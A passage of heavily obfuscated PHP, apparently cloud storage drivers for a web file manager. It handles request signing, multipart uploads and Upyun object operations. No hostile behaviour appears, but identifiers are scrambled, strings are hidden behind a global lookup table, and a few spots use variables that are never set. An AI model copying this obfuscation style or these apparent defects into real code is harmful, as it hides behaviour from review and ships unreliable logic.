base64_encode(json_encode($™ı¤ÉüÆ)); $Êşš¿ò· = hash_hmac($Ÿó¾¢ğ›[1362], $µûøÛ˜„, $Ÿó¾¢ğ›[1363] . $this->secret, !0); $Š›„‰’ù = hash_hmac($Ÿó¾¢ğ›[1362], $this->region, $Êşš¿ò·, !0); $ä«·ÀşÌ = hash_hmac($Ÿó¾¢ğ›[1362], $¬ÇŸë³ù, $Š›„‰’ù, !0); $¼Çµ·±¨ = hash_hmac($Ÿó¾¢ğ›[1362], $÷Ş’¤–Õ, $ä«·ÀşÌ, !0); $¿¥ƒ±Ùï = hash_hmac($Ÿó¾¢ğ›[1362], $‹ëøåÙ¥, $¼Çµ·±¨); $ÓñÏ—Óß = array($Ÿó¾¢ğ›[215] => $Ÿó¾¢ğ›[12], $Ÿó¾¢ğ›[1364] => $Ÿó¾¢ğ›[12], $Ÿó¾¢ğ›[1320] => $ø„ €¡‡, $Ÿó¾¢ğ›[1324] => $å­ñÁ£¬, $Ÿó¾¢ğ›[1328] => $‹ëøåÙ¥, $Ÿó¾¢ğ›[1365] => $ó…ö°ƒˆ, $Ÿó¾¢ğ›[1366] => $¬ÙÑè‡, $Ÿó¾¢ğ›[1367] => $Ÿïæ¢Ì, $Ÿó¾¢ğ›[1368] => $¤¤Ã”á, $Ÿó¾¢ğ›[1369] => $¿¥ƒ±Ùï, $Ÿó¾¢ğ›[181] => $this->getHost()); return $ÓñÏ—Óß; } public function multiUploadFormData($ßƒäöå®, $°öËÕä = 3600) { $±ü¢Ÿîà =& $_SERVER[ Ö‘ñÄ”]; $Ğí€İÍ = gmdate($±ü¢Ÿîà[1448]); $‹öéùÅ„ = array(); $¶İßÍŒ× = $this->client->getUploadId($this->bucket, $ßƒäöå®, $‹öéùÅ„); if (!$¶İßÍŒ×) { return !1; } return array($±ü¢Ÿîà[223] => $¶İßÍŒ×, $±ü¢Ÿîà[181] => $this->getHost() . $±ü¢Ÿîà[8] . $this->pathEncode($ßƒäöå®), $±ü¢Ÿîà[224] => $Ğí€İÍ, $±ü¢Ÿîà[94] => $ßƒäöå®); } public function multiUploadAuthData($áº½øÏ•, $ÁÊÀ¡æŞ = array()) { $·áì»ıø =& $_SERVER[ Ö‘ñÄ”]; $…¶€ñ¬¿ = isset($ÁÊÀ¡æŞ[$·áì»ıø[174]]) ? $ÁÊÀ¡æŞ[$·áì»ıø[174]] : $·áì»ıø[12]; $ó²ş¬ôØ = $ÁÊÀ¡æŞ[$·áì»ıø[94]]; unset($ÁÊÀ¡æŞ[$·áì»ıø[94]]); if (isset($ÁÊÀ¡æŞ[$·áì»ıø[225]])) { return $this->listUploadParts($ó²ş¬ôØ, $ÁÊÀ¡æŞ); } $Ó¸äÌÃÚ = array(); if (isset($ÁÊÀ¡æŞ[$·áì»ıø[1449]])) { $Ó¸äÌÃÚ[$·áì»ıø[1450]] = $ÁÊÀ¡æŞ[$·áì»ıø[1449]]; } $î´­’ìô = explode($·áì»ıø[183], $this->getHost()); $×òÈ•¢œ = array($·áì»ıø[1451] => $î´­’ìô[1], $·áì»ıø[1452] => $·áì»ıø[12], $·áì»ıø[215] => $·áì»ıø[120], $·áì»ıø[1364] => $ÁÊÀ¡æŞ[$·áì»ıø[76]]); $´±›†èÏ = $·áì»ıø[228]; $Ü®®ìô‘ = $·áì»ıø[8] . $this->pathEncode($ó²ş¬ôØ) . $…¶€ñ¬¿; $È×µéà• = $this->client->__getSignatureV4($Ó¸äÌÃÚ, $×òÈ•¢œ, $´±›†èÏ, $Ü®®ìô‘); if (strpos($…¶€ñ¬¿, $·áì»ıø[227]) === 0) { if (isset($Ó¸äÌÃÚ[$·áì»ıø[1450]])) { $¦ş›âòœ = $Ó¸äÌÃÚ[$·áì»ıø[1450]]; } else { if (isset($È×µéà•[$·áì»ıø[1450]])) { $¦ş›âòœ = $È×µéà•[$·áì»ıø[1450]]; } else { $¦ş›âòœ = hash($·áì»ıø[1362], $·áì»ıø[12]); } } return array($·áì»ıø[234] => $È×µéà•[$·áì»ıø[234]], $·áì»ıø[1450] => $¦ş›âòœ, $·áì»ıø[224] => $È×µéà•[$·áì»ıø[1453]]); } return $È×µéà•[$·áì»ıø[234]]; } public function listUploadParts($ò»²åèÈ, $®‹ûû¯Ş = array()) { $‘‘İ´½ =& $_SERVER[ Ö‘ñÄ”]; $õ°³“ˆ€ = str_replace($‘‘İ´½[235], $‘‘İ´½[12], $®‹ûû¯Ş[$‘‘İ´½[174]]); $ÓÈíÕ¤¬ = $this->client->listParts($this->bucket, $ò»²åèÈ, $õ°³“ˆ€); if (!$ÓÈíÕ¤¬) { return !1; } $—³µ§Áˆ = $‘‘İ´½[1454]; foreach ($ÓÈíÕ¤¬ as $Ÿ¨­‚ö¡) { $—³µ§Áˆ .= $‘‘İ´½[1455] . "\x3c\x50\141\x72\164\x4e\165\155\x62\x65\x72\76{$Ÿ¨­‚ö¡[$‘‘İ´½[1409]]}\74\57\120\141\x72\164\116\x75\155\x62\145\x72\x3e\12" . "\74\105\x54\141\147\x3e{$Ÿ¨­‚ö¡[$‘‘İ´½[1410]]}\74\57\x45\x54\141\x67\76\12" . $‘‘İ´½[1456]; } $—³µ§Áˆ .= $‘‘İ´½[1457]; $Ã¥ÖÂÈû = array(); $Ç¤Ê—¶â = explode($‘‘İ´½[183], $this->getHost()); $à‹¥Ë´å = array($‘‘İ´½[1451] => $Ç¤Ê—¶â[1], $‘‘İ´½[215] => $‘‘İ´½[120], $‘‘İ´½[1364] => strlen($—³µ§Áˆ)); $Ü¥ƒÏ° = $‘‘İ´½[226]; $Á±’ˆûü = $‘‘İ´½[8] . $this->pathEncode($ò»²åèÈ) . $®‹ûû¯Ş[$‘‘İ´½[174]]; $Ï€íİˆ = $this->client->__getSignatureV4($Ã¥ÖÂÈû, $à‹¥Ë´å, $Ü¥ƒÏ°, $Á±’ˆûü, $—³µ§Áˆ); return array($‘‘İ´½[234] => $Ï€íİˆ[$‘‘İ´½[234]], $‘‘İ´½[224] => $Ï€íİˆ[$‘‘İ´½[1453]], $‘‘İ´½[236] => $ÓÈíÕ¤¬, $‘‘İ´½[1450] => $Ï€íİˆ[$‘‘İ´½[1450]]); } public function link($ı˜§”¾Ü, $íÏ¬´éÍ = array()) { return parent::link($ı˜§”¾Ü, $íÏ¬´éÍ); } public function fileOut($”¶¢Ñ›Ô, $’şŒÅ«× = false, $¦¦ÅØÄÉ = false, $”şŒ¨Ûª = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ Ö‘ñÄ”][1458])) { return parent::fileOutServer($”¶¢Ñ›Ô, $’şŒÅ«×, $¦¦ÅØÄÉ, $”şŒ¨Ûª); } parent::fileOut($”¶¢Ñ›Ô, $’şŒÅ«×, $¦¦ÅØÄÉ, $”şŒ¨Ûª); } public function fileOutImage($ºÍÓ–ò, $É¡‹¤™ = 250) { if (strstr($this->endpoint, $_SERVER[ Ö‘ñÄ”][1458])) { return parent::fileOutImageServer($ºÍÓ–ò, $É¡‹¤™); } parent::fileOutImage($ºÍÓ–ò, $É¡‹¤™); } public function fileOutLink($º´Ò·¢Ã) { $”üşÊ² =& $_SERVER[ Ö‘ñÄ”]; if (substr($º´Ò·¢Ã, 0, 7) == $”üşÊ²[1331]) { $º´Ò·¢Ã = $”üşÊ²[1332] . substr($º´Ò·¢Ã, 7); } header($”üşÊ²[161] . $º´Ò·¢Ã); die; } public function getHost() { $™ÒÑøÍ =& $_SERVER[ Ö‘ñÄ”]; $Ú×ş õŒ = str_rtrim(parent::getHost(), $™ÒÑøÍ[8] . $this->bucket); $Ú×ş õŒ = explode($™ÒÑøÍ[183], $Ú×ş õŒ); return $Ú×ş õŒ[0] . $™ÒÑøÍ[183] . $this->bucket . $™ÒÑøÍ[10] . $Ú×ş õŒ[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($×÷Üš‘Ú, $ÂàëÆ»Ù = 0) { parent::__construct(); $this->source = $×÷Üš‘Ú; $this->sourceSize = $ÂàëÆ»Ù; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ËÄ•ñ´ = false) { return $this->sourceSize; } public function getContent($“§åí±¯ = false) { return $this->fileSubstr($“§åí±¯, 0, $this->sourceSize); } public function fileSubstr($ı½µÜ´Ô = false, $à†¨Ëó‡ = 0, $Ë•„üÓÈ = 0) { if (!$Ë•„üÓÈ) { $Ë•„üÓÈ = $this->sourceSize; } $Ú«„²Ø³ = $this->sourceSize - $à†¨Ëó‡; if ($Ë•„üÓÈ >= $Ú«„²Ø³) { $Ë•„üÓÈ = $Ú«„²Ø³; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $à†¨Ëó‡, $Ë•„üÓÈ); } if ($this->sourceType == self::TYPE_FILE) { if ($Ë•„üÓÈ <= 0) { return $_SERVER[ Ö‘ñÄ”][12]; } $‹±ªÂº‚ = ftell($this->source); fseek_64($this->source, $‹±ªÂº‚ + $à†¨Ëó‡); $€şìì¤â = @fread($this->source, $Ë•„üÓÈ); fseek_64($this->source, $‹±ªÂº‚); return $€şìì¤â; } } public function hashMd5($‘´öï¬Ì = false) { return md5($this->getContent()); } public static function hash($­áÒû¶è, $ş…Ÿ“¦¡ = 0) { $ÙÁùé« = new PathDriverStream($­áÒû¶è, $ş…Ÿ“¦¡); return $ÙÁùé«->hashSimple($­áÒû¶è); } public static function md5($„É÷šÏ¼, $«Œ•òÀô = 0) { $ùêÀ‚é = new PathDriverStream($„É÷šÏ¼, $«Œ•òÀô); return $ùêÀ‚é->hashMd5($„É÷šÏ¼); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\x74\160\72\x2f\57\166\60\x2e\x61\160\x69\56\x75\x70\171\x75\156\x2e\143\x6f\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($¸˜„Á¹á) { parent::__construct(); $this->_init($¸˜„Á¹á); } public function _init($¬÷ë¿Ó†) { $§ÀÃ‰ó• =& $_SERVER[ Ö‘ñÄ”]; foreach ($¬÷ë¿Ó† as $ÈÏ”®Šı => $¾Ğ‹¿‚Û) { if (isset($this->{$ÈÏ”®Šı})) { $this->{$ÈÏ”®Šı} = $¾Ğ‹¿‚Û; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($§ÀÃ‰ó•[1459] . LNG($§ÀÃ‰ó•[1390])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($ƒ«ø¶öÜ, $Ÿ¸Ùµé = "\x47\105\124") { $öœãŠê =& $_SERVER[ Ö‘ñÄ”]; $•ù¹²ší = gmdate($öœãŠê[1423]); $¿ªÜÖ¢ = base64_encode(hash_hmac($öœãŠê[1460], "{$Ÿ¸Ùµé}\46{$ƒ«ø¶öÜ}\46{$•ù¹²ší}", md5("{$this->userpass}"), !0)); $Àëñ„œÍ = array("\101\x75\164\150\157\162\x69\172\141\164\x69\x6f\156\72\125\x50\131\x55\116\x20{$this->username}\x3a{$¿ªÜÖ¢}", "\x44\x61\164\145\x3a{$•ù¹²ší}"); return $Àëñ„œÍ; } public function ussRequest($ßã˜å”, $ãÍìŞÊŒ = "\107\x45\x54", $›‘É«Û = false, $êıúƒª¼ = false, $‘¾©Ç¥ = false) { $™œ÷æä´ =& $_SERVER[ Ö‘ñÄ”]; $ßã˜å” = trim($ßã˜å”, $™œ÷æä´[8]); $ëÃ©‹ = "\x2f{$this->bucket}\57{$ßã˜å”}"; $èç˜¯¤Î = $this->ussHeaders($ëÃ©‹, $ãÍìŞÊŒ); if ($êıúƒª¼) { $èç˜¯¤Î = array_merge($èç˜¯¤Î, $êıúƒª¼); } $ç®¬Œ†å = url_request($this->endpoint . $ëÃ©‹, $ãÍìŞÊŒ, $›‘É«Û, $èç˜¯¤Î, $‘¾©Ç¥); if (!$ç®¬Œ†å) { return array($™œ÷æä´[1197] => !1, $™œ÷æä´[1199] => $™œ÷æä´[1461]); } if (strtolower($ãÍìŞÊŒ) == $™œ÷æä´[196] || in_array($ç®¬Œ†å[$™œ÷æä´[1197]], array($™œ÷æä´[1316], $™œ÷æä´[1462]))) { $›‘É«Û = $ç®¬Œ†å[$™œ÷æä´[1463]]; } else { $›‘É«Û = json_decode($ç®¬Œ†å[$™œ÷æä´[1199]], !0); if (!$›‘É«Û) { $›‘É«Û = $ç®¬Œ†å[$™œ÷æä´[1199]]; } else { if (!$ç®¬Œ†å[$™œ÷æä´[763]] && isset($›‘É«Û[$™œ÷æä´[1464]])) { $›‘É«Û = $›‘É«Û[$™œ÷æä´[1464]]; } } } return array($™œ÷æä´[1197] => $ç®¬Œ†å[$™œ÷æä´[763]], $™œ÷æä´[1199] => $›‘É«Û); } public function mkfile($µ½†å, $“ĞÏÛ“‘ = '', $¿ÕŞÜÛå = REPEAT_RENAME) { if ($this->setContent($µ½†å, $“ĞÏÛ“‘)) { return $this->getPathOuter($µ½†å); } return !1; } public function mkdir($âØ™±, $Å÷€Ùë½ = REPEAT_SKIP) { $Íãè›–Ğ =& $_SERVER[ Ö‘ñÄ”]; $é÷İŠÂ¡ = trim($âØ™±, $Íãè›–Ğ[8]); if ($this->_isFolder($é÷İŠÂ¡)) { return $this->getPathOuter($é÷İŠÂ¡); } $ÌäÙìÚ› = array($Íãè›–Ğ[1465]); $â û¿å¥ = $this->ussRequest($é÷İŠÂ¡, $Íãè›–Ğ[226], !1, $ÌäÙìÚ›); return $â û¿å¥[$Íãè›–Ğ[1197]] ? $this->getPathOuter($é÷İŠÂ¡) : !1; } public function copyFile($ñ„âª¡„, $¤‘´İüº) { $»Ùäàóõ =& $_SERVER[ Ö‘ñÄ”]; $©Ğî™ß = array($»Ùäàóõ[1466] . "\57{$this->bucket}\57{$ñ„âª¡„}", $»Ùäàóõ[1467]); $É—‚ÉçÀ = $this->ussRequest($¤‘´İüº, $»Ùäàóõ[228], !1, $©Ğî™ß); return $É—‚ÉçÀ[$»Ùäàóõ[1197]] ? !0 : $this->getPathOuter($¤‘´İüº); } public function moveFile($İã ôÂ, $çÇ§‹) { $Õêë©¤ =& $_SERVER[ Ö‘ñÄ”]; $œ¸éŸæä = array($Õêë©¤[1468] . "\57{$this->bucket}\57{$İã ôÂ}", $Õêë©¤[1467]); $¶Íƒ¼³ = $this->ussRequest($çÇ§‹, $Õêë©¤[228], !1, $œ¸éŸæä); return $¶Íƒ¼³[$Õêë©¤[1197]] ? !0 : $this->getPathOuter($çÇ§‹); } public function delFile($ÒÜïá‡È) { $Ï‰É›Ú =& $_SERVER[ Ö‘ñÄ”]; $®ÎÎÜ¡ú = $this->ussRequest($ÒÜïá‡È, $Ï‰É›Ú[1469]); return $®ÎÎÜ¡ú[$Ï‰É›Ú[1197]] ? !0 : !1; } public function delFolder($”×Éü) { $Šƒš« =& $_SERVER[ Ö‘ñÄ”]; if (!$this->exist($”×Éü)) { return !0; } $this->listItemCache = !1; $óÁâ‰Ùü = $’íà­ = array(); $this->fileList($”×Éü, $óÁâ‰Ùü, $’íà­, !0); $this->listItemCache = !0; foreach ($’íà­ as $ÒäîÈ¡) { $ÖÂòä³¥ = $this->ussRequest($ÒäîÈ¡[$Šƒš«[32]], $Šƒš«[1469]); if (!$ÖÂòä³¥[$Šƒš«[1197]]) { return !1; } } foreach ($óÁâ‰Ùü as $‡Šã­Î) { $ÖÂòä³¥ = $this->ussRequest($‡Šã­Î, $Šƒš«[1469]); if (!$ÖÂòä³¥[$Šƒš«[1197]]) { return !1; } } $ÖÂòä³¥ = $this->ussRequest($”×Éü, $Šƒš«[1469]); return $ÖÂòä³¥[$Šƒš«[1197]]; } public function rename($ä»³£ñŞ, $â¼ıƒÇÒ) { if ($this->isFile($ä»³£ñŞ)) { $â¼ıƒÇÒ = get_path_father($ä»³£ñŞ) . $â¼ıƒÇÒ; return $this->moveFile($ä»³£ñŞ, $â¼ıƒÇÒ); } return $this->renameObject($ä»³£ñŞ, $â¼ıƒÇÒ); } public function fileInfo($÷å˜ê’, $éñ´İÑÕ = false, $‹õ»Å÷Ó = array()) { $ßá‘ı¬° =& $_SERVER[ Ö‘ñÄ”]; $ÊÖíÛø§ = array($ßá‘ı¬°[32] => $this->pathThis($÷å˜ê’), $ßá‘ı¬°[84] => $this->getPathOuter($ßá‘ı¬°[8] . $÷å˜ê’), $ßá‘ı¬°[33] => $ßá‘ı¬°[199], $ßá‘ı¬°[76] => isset($‹õ»Å÷Ó[$ßá‘ı¬°[76]]) ? $‹õ»Å÷Ó[$ßá‘ı¬°[76]] : 0, $ßá‘ı¬°[174] => $this->ext($÷å˜ê’)); if ($éñ´İÑÕ) { return $ÊÖíÛø§; } $ÊÖíÛø§[$ßá‘ı¬°[200]] = $ÊÖíÛø§[$ßá‘ı¬°[85]] = 0; $ÊÖíÛø§[$ßá‘ı¬°[201]] = $ÊÖíÛø§[$ßá‘ı¬°[202]] = !0; if (empty($‹õ»Å÷Ó)) { $‹õ»Å÷Ó = $this->objectMeta($÷å˜ê’); if (!$‹õ»Å÷Ó) { return $ÊÖíÛø§; } } $ÊÖíÛø§[$ßá‘ı¬°[200]] = intval($‹õ»Å÷Ó[$ßá‘ı¬°[1470]]); $ÊÖíÛø§[$ßá‘ı¬°[85]] = intval($‹õ»Å÷Ó[$ßá‘ı¬°[1471]]); $ÊÖíÛø§[$ßá‘ı¬°[76]] = $‹õ»Å÷Ó[$ßá‘ı¬°[76]]; return $ÊÖíÛø§; } public function folderInfo($¼Ó¥Ş¬, $³ÈÚøˆÎ = false) { $¨ãòíÈä =& $_SERVER[ Ö‘ñÄ”]; $Íì‚¨Ğ° = array($¨ãòíÈä[32] => $this->pathThis($¼Ó¥Ş¬), $¨ãòíÈä[84] => $this->getPathOuter($¨ãòíÈä[8] . $¼Ó¥Ş¬), $¨ãòíÈä[33] => $¨ãòíÈä[75]); if ($³ÈÚøˆÎ) { return $Íì‚¨Ğ°; } $Íì‚¨Ğ°[$¨ãòíÈä[200]] = $Íì‚¨Ğ°[$¨ãòíÈä[85]] = 0; $Íì‚¨Ğ°[$¨ãòíÈä[201]] = $Íì‚¨Ğ°[$¨ãòíÈä[202]] = !0; if (empty($´‚Ïêù¹)) { $´‚Ïêù¹ = $this->objectMeta($¼Ó¥Ş¬); if (!$´‚Ïêù¹) { return $Íì‚¨Ğ°; } } $Íì‚¨Ğ°[$¨ãòíÈä[200]] = intval($´‚Ïêù¹[$¨ãòíÈä[1470]]); $Íì‚¨Ğ°[$¨ãòíÈä[85]] = intval($´‚Ïêù¹[$¨ãòíÈä[1471]]); return $Íì‚¨Ğ°; } private function listObjs($ù¨¿›Ÿé, $Á¡ø¦±ı = 0, $‹º·é‡² = 1000) { $®Œ½Ëş =& $_SERVER[ Ö‘ñÄ”]; $Ê°¢¿àë = array($®Œ½Ëş[1472], $®Œ½Ëş[1473] . $‹º·é‡²); if ($Á¡ø¦±ı) { $Ê°¢¿àë[] = $®Œ½Ëş[1474] . $Á¡ø¦±ı; } $¸åüØ²˜ = $this->ussRequest($ù¨¿›Ÿé, $®Œ½Ëş[230], !1, $Ê°¢¿àë); return !$¸åüØ²˜[$®Œ½Ëş[1197]] ? !1 : $¸åüØ²˜[$®Œ½Ëş[1199]]; } private function fileList($²­ÛâüÖ, &$·„–¦Ö°, &$™ß§, $÷¿´Şî– = false) { $ºÔñÚ—¯ =& $_SERVER[ Ö‘ñÄ”]; $‹îõòà = $ºÔñÚ—¯[12]; $Ì–Çü™Ç = 1000; $ãµ·­¹ç = rtrim($²­ÛâüÖ, $ºÔñÚ—¯[8]) . $ºÔñÚ—¯[8]; while (!0) { check_abort(); $ëš’…¯‚ = $this->listObjs($²­ÛâüÖ, $‹îõòà, $Ì–Çü™Ç); if (!$ëš’…¯‚) { return !1; } $‹îõòà = isset($ëš’…¯‚[$ºÔñÚ—¯[1475]]) ? $ëš’…¯‚[$ºÔñÚ—¯[1475]] : $ºÔñÚ—¯[12]; $ü±ˆ³‚” = isset($ëš’…¯‚[$ºÔñÚ—¯[1476]]) ? $ëš’…¯‚[$ºÔñÚ—¯[1476]] : array(); foreach ($ü±ˆ³‚” as $¢Êİ¥Ò­) { $‘éÓÏÇË = $¢Êİ¥Ò­[$ºÔñÚ—¯[33]] == $ºÔñÚ—¯[75] ? !0 : !1; $˜û´É¥Ä = ltrim($ãµ·­¹ç . $¢Êİ¥Ò­[$ºÔñÚ—¯[32]], $ºÔñÚ—¯[8]) . ($‘éÓÏÇË ? $ºÔñÚ—¯[8] : $ºÔñÚ—¯[12]); $Æ±£Âåñ = array($ºÔñÚ—¯[32] => $˜û´É¥Ä, $ºÔñÚ—¯[33] => $‘éÓÏÇË ? $ºÔñÚ—¯[75] : $ºÔñÚ—¯[199], $ºÔñÚ—¯[76] => $¢Êİ¥Ò­[$ºÔñÚ—¯[346]], $ºÔñÚ—¯[1471] => $¢Êİ¥Ò­[$ºÔñÚ—¯[1477]]); $this->cacheMethodInfoSet($˜û´É¥Ä, $‘éÓÏÇË, $Æ±£Âåñ); if ($‘éÓÏÇË) { $·„–¦Ö°[] = $˜û´É¥Ä; if ($÷¿´Şî–) { $this->fileList($˜û´É¥Ä, $·„–¦Ö°, $™ß§, $÷¿´Şî–); } continue; } $™ß§[] = $Æ±£Âåñ; } if (count($ü±ˆ³‚”) < $Ì–Çü™Ç) { break; } } $this->cacheMethodInfoSet($²­ÛâüÖ, !0); } public function listPath($Öæùüö, $ÈÈ³ò = false) { $‹ãÉ§Ò =& $_SERVER[ Ö‘ñÄ”]; $ÕÀÒ²ìá = $áº‡ıĞ = array(); $this->fileList($Öæùüö, $ÕÀÒ²ìá, $áº‡ıĞ); foreach ($ÕÀÒ²ìá as $ŒŒé²ì => $³ùéğ) { $ÕÀÒ²ìá[$ŒŒé²ì] = $this->folderInfo($³ùéğ, $ÈÈ³ò); } foreach ($áº‡ıĞ as $ŒŒé²ì => $³ùéğ) { $áº‡ıĞ[$ŒŒé²ì] = $this->fileInfo($³ùéğ[$‹ãÉ§Ò[32]], $ÈÈ³ò, $³ùéğ); } return array($‹ãÉ§Ò[82] => $ÕÀÒ²ìá, $‹ãÉ§Ò[83] => $áº‡ıĞ); } public function has($ÒÛü­©î, $Íáø©ß = false, $¯šéÌ€Å = true) { $¯ÔÉóÖÆ =& $_SERVER[ Ö‘ñÄ”]; $ùœş’¤Ğ = $¯ÔÉóÖÆ[12]; $Ñç¦°¶  = 500; $İ¯ï³Ğ = 0; $ãÄÇ»¼â = 0; $ø»Èœñ¥ = rtrim($ÒÛü­©î, $¯ÔÉóÖÆ[8]) . $¯ÔÉóÖÆ[8]; while (!0) { check_abort(); $§«‡Úİ = $this->listObjs($ÒÛü­©î, $ùœş’¤Ğ, $Ñç¦°¶ ); if (!$§«‡Úİ) { return !1; } $ùœş’¤Ğ = isset($§«‡Úİ[$¯ÔÉóÖÆ[1475]]) ? $§«‡Úİ[$¯ÔÉóÖÆ[1475]] : $¯ÔÉóÖÆ[12]; $öĞ´Ó‰É = isset($§«‡Úİ[$¯ÔÉóÖÆ[1476]]) ? $§«‡Úİ[$¯ÔÉóÖÆ[1476]] : array(); if (empty($öĞ´Ó‰É)) { break; } $šú†ĞôŒ = array_filter($öĞ´Ó‰É, function ($ïìİúÎÜ) { $¾ö–Óä€ =& $_SERVER[ Ö‘ñÄ”]; return $ïìİúÎÜ[$¾ö–Óä€[33]] == $¾ö–Óä€[75]; }); $¤µ«€ÔÇ = count($öĞ´Ó‰É); $šú†ĞôŒ = count($šú†ĞôŒ); $ßÄ¿¡âÀ = $¤µ«€ÔÇ - $šú†ĞôŒ; if ($Íáø©ß) { $ãÄÇ»¼â += $šú†ĞôŒ; $İ¯ï³Ğ += $ßÄ¿¡âÀ; if ($¤µ«€ÔÇ < $Ñç¦°¶ ) { break; } continue; } if ($¯šéÌ€Å) { if ($ßÄ¿¡âÀ) { return !0; } } else { if ($šú†ĞôŒ) { return !0; } } if ($¤µ«€ÔÇ < $Ñç¦°¶ ) { break; } } if ($Íáø©ß) { return array($¯ÔÉóÖÆ[207] => $İ¯ï³Ğ, $¯ÔÉóÖÆ[208] => $ãÄÇ»¼â); } return !1; } public function listAll($ê¨´Œœè) { $ô‰ª·£° =& $_SERVER[ Ö‘ñÄ”]; $Ï„éë¨ = $ÀÎæıø = array(); $this->fileList($ê¨´Œœè, $Ï„éë¨, $ÀÎæıø, !0); $§Ù ®æğ = array(); foreach ($ÀÎæıø as $ÓÓÊœ›İ) { $§Ù ®æğ[$ÓÓÊœ›İ[$ô‰ª·£°[32]]] = $ÓÓÊœ›İ[$ô‰ª·£°[76]]; } foreach ($Ï„éë¨ as $ÓÓÊœ›İ) { if (is_string($ÓÓÊœ›İ)) { $§Ù ®æğ[$ÓÓÊœ›İ] = 0; } } return $this->listAllFiles($ê¨´Œœè, array_keys($§Ù ®æğ), $§Ù ®æğ); } public function canRead($¹¹àáƒö) { return $this->exist($¹¹àáƒö) ? !0 : !1; } public function canWrite($ÖÈğÖ¬–) { return $this->exist($ÖÈğÖ¬–) ? !0 : !1; } public function getContent($®¡Å”÷×) { return $this->fileSubstr($®¡Å”÷×, 0, -1); } public function setContent($Èû†ÜŒÙ, $©›¹¼ÈÈ = '') { $Õ³ˆ•ŸÙ =& $_SERVER[ Ö‘ñÄ”]; if (!$©›¹¼ÈÈ) { $Ø¹ş…·Í = $this->ussRequest($Èû†ÜŒÙ, $Õ³ˆ•ŸÙ[226]); return $Ø¹ş…·Í[$Õ³ˆ•ŸÙ[1197]]; } $‘àÛı“Å = $this->tempFile($this->pathThis($Èû†ÜŒÙ)); file_put_contents($‘àÛı“Å, $©›¹¼ÈÈ); if ($this->upload($Èû†ÜŒÙ, $‘àÛı“Å)) { $this->tempFileRemve($‘àÛı“Å); return !0; } return !1; } public function fileSubstr($â™ÕíÎ, $ºŒä®¾ä, $áı€¨°Ê) { $æÂà×¡Í =& $_SERVER[ Ö‘ñÄ”]; if (!($ùêßÅ¥‰ = $this->link($â™ÕíÎ))) { return !1; } $‘Ÿµ©´Ï = !1; if ($áı€¨°Ê > 0) { $ã¹ªåâƒ = $ºŒä®¾ä + $áı€¨°Ê - 1; $‘Ÿµ©´Ï = array($æÂà×¡Í[1438] . $ºŒä®¾ä . $æÂà×¡Í[394] . $ã¹ªåâƒ); } $ô®ŸôÃ„ = url_request($ùêßÅ¥‰, $æÂà×¡Í[230], !1, $‘Ÿµ©´Ï); return $ô®ŸôÃ„[$æÂà×¡Í[763]] ? $ô®ŸôÃ„[$æÂà×¡Í[1199]] : !1; } public function upload($Ùš§äúÜ, $İëÒç, $¶Êáˆ« = false, $¯®ö­¬ = REPEAT_REPLACE) { $óªÏÚİÉ =& $_SERVER[ Ö‘ñÄ”]; $˜¶ã— = IO::size($İëÒç); if ($˜¶ã— <= 1024 * 1024 * 200) { $ËÖ†üÆ = array($óªÏÚİÉ[1478] . $İëÒç); $¨øßÑÑâ = $this->ussRequest($Ùš§äúÜ, $óªÏÚİÉ[228], $ËÖ†üÆ); return $¨øßÑÑâ[$óªÏÚİÉ[1197]] ? $this->getPathOuter($Ùš§äúÜ) : !1; } $ñ‘ˆ¨‰³ = 1024 * 1024 * 10; $îÜ÷½¶ = array($óªÏÚİÉ[1479], $óªÏÚİÉ[1480] . $˜¶ã—, $óªÏÚİÉ[1481], $óªÏÚİÉ[1482] . $ñ‘ˆ¨‰³); $¨øßÑÑâ = $this->ussRequest($Ùš§äúÜ, $óªÏÚİÉ[228], !1, $îÜ÷½¶); if (!$¨øßÑÑâ[$óªÏÚİÉ[1197]]) { return !1; } $†éÊê’© = $¨øßÑÑâ[$óªÏÚİÉ[1199]]; $½Ò¢‰°à = 0; $çÖ¹İ«ª = $†éÊê’©[$óªÏÚİÉ[1483]]; $”©§ÇÃ = fopen($İëÒç, $óªÏÚİÉ[1387]); if (!$”©§ÇÃ) { return !1; } do { $šá–«ãÑ = $†éÊê’©[$óªÏÚİÉ[1484]]; fseek_64($”©§ÇÃ, $½Ò¢‰°à); $»–›°İ¶ = fread($”©§ÇÃ, $šá–«ãÑ); $º±‡Í’ = 0; do { $º±‡Í’++; $†éÊê’© = $this->uploadPart($Ùš§äúÜ, $†éÊê’©, $»–›°İ¶); } while (!$†éÊê’© && $º±‡Í’ < 3); if (!$†éÊê’©) { return !1; } $çÖ¹İ«ª = $†éÊê’©[$óªÏÚİÉ[1483]]; $½Ò¢‰°à += $šá–«ãÑ; } while ($çÖ¹İ«ª != -1); fclose($”©§ÇÃ); $îÜ÷½¶ = array($óªÏÚİÉ[1485], $óªÏÚİÉ[1486] . $†éÊê’©[$óªÏÚİÉ[1487]], $óªÏÚİÉ[1481]); $¨øßÑÑâ = $this->ussRequest($Ùš§äúÜ, $óªÏÚİÉ[228], !1, $îÜ÷½¶); return $¨øßÑÑâ[$óªÏÚİÉ[1197]] ? $this->getPathOuter($ÀÁşÔÌ) : !1; } private function uploadPart($Ù¯Ê”ÆŒ, $Œ´Ûòà, &$ô×÷¸Úı) { $ôœÆ¯õ =& $_SERVER[ Ö‘ñÄ”]; $ÁÇ¬êšÕ = array($ôœÆ¯õ[1488], $ôœÆ¯õ[1486] . $Œ´Ûòà[$ôœÆ¯õ[1487]], $ôœÆ¯õ[1489] . $Œ´Ûòà[$ôœÆ¯õ[1483]], $ôœÆ¯õ[142] . $Œ´Ûòà[$ôœÆ¯õ[1484]]); $ú¾¾Ú§ = $this->ussRequest($Ù¯Ê”ÆŒ, $ôœÆ¯õ[228], $ô×÷¸Úı, $ÁÇ¬êšÕ); return 